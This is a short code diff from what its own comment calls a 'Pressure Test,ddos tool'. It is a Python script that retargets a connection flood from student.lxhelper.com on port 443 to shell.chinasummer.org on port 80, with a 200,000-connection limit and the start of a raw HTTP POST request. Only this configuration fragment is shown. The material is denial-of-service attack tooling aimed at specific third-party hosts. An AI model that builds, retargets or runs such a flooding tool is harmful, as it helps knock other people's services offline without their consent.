@@ -6,8 +6,8 @@ import threading
 # Pressure Test,ddos tool
 # ---------------------------
 MAX_CONN = 200000
-PORT = 443
-HOST = "student.lxhelper.com"
+PORT = 80
+HOST = "shell.chinasummer.org"
 PAGE = "/"
 # ---------------------------
 buf = ("POST %s HTTP/1.1\r\n"
